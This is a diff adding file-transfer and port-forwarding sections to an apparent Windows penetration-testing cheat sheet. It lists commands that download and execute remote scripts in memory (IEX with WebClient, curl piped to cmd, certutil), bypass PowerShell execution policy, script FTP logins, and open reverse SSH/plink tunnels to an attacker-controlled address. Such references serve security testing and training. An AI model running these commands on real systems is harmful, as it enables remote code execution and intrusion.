@@ -329,7 +329,88 @@ Get-ChildItem C:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction Sil
 
 ## Techniques
 
+### Transferring Files
 
+PowerShell Cmdlet
+```PowerShell
+Invoke-WebRequest "https://server/filename" -OutFile "C:\Windows\Temp\filename"
+```
+
+PowerShell One-Liner
+```PowerShell
+(New-Object System.Net.WebClient).DownloadFile("https://server/filename", "C:\Windows\Temp\filename")
+```
+
+PowerShell One-Line Script Execution in Memory
+```PowerShell
+IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')
+```
+
+PowerShell with Proxy
+```PowerShell
+$browser = New-Object System.Net.WebClient;
+$browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
+IEX($browser.DownloadString('https://server/script.ps1'));
+```
+
+PowerShell Script
+```PowerShell
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://server/file.exe" >>wget.ps1
+echo $file = "output-file.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+		
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+```
+
+Non-interactive FTP via text file. Useful for when you only have limited command execution.
+```CMD
+echo open 10.10.10.11 21> ftp.txt
+echo USER username>> ftp.txt
+echo mypassword>> ftp.txt
+echo bin>> ftp.txt
+echo GET filename>> ftp.txt
+echo bye>> ftp.txt
+		
+ftp -v -n -s:ftp.txt
+```
+
+CertUtil
+```CMD
+certutil.exe -urlcache -split -f https://myserver/filename outputfilename
+```
+
+Certutil can also be used for base64 encoding/decoding.
+```CMD
+certutil.exe -encode inputFileName encodedOutputFileName
+certutil.exe -decode encodedInputFileName decodedOutputFileName
+```
+
+CURL
+```CMD
+curl http://server/file -o file
+curl http://server/file.bat | cmd
+```
+
+And with PowerShell
+```PowerShell
+IEX(curl http://server/script.ps1);Invoke-Blah
+```
+
+### Port Forwarding
+
+For example to expose SMB, on the target run:
+
+```cmd
+plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
+```
+
+SSH enabled in Win10 1803 by default
+```CMD
+ssh -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
+```
+
+### Port Forwarding
 
 
 
